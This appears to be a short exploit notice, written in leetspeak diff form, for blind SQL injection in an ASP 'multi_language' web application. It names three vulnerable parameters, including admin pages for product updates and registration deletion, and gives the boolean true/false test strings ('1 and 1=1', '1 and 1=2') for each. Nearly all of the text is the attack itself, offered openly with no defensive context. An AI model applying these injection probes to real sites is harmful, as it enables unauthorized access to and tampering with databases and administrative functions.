@@ -1,0 +1,27 @@
+[*] Err0r C0N50L3:
+ 
+[*] http://server/multi_language/adminsection/products_update.asp?ProductID={Err0r}
+ 
+ 
+[*] EV!L BL!ND sql
+ 
+/multi_language/adminsection/products_update.asp?ProductID={Devil ro0t}
+0R
+/multi_language/adminsection/RegistrationResults.asp?Delete={JuPA}
+o&amp;#1103;
+/multi_language/content.asp?ContentID=((M2Z))
+ 
+[~] (Devil ro0t):
+7Ru3 : products_update.asp?ProductID=1 and 1=1
+f4L53: products_update.asp?ProductID=1 and 1=2
+ 
+0R
+[*]:(JUPA)
+7Ru3 : RegistrationResults.asp?Delete=1 and 1=1
+f4L53: RegistrationResults.asp?Delete=1 and 1=2
+ 
+0&amp;#1103;
+[*]:(M2Z)
+7Ru3 : content.asp?ContentID=1 and 1=1
+f4L53: content.asp?ContentID=1 and 1=2
+
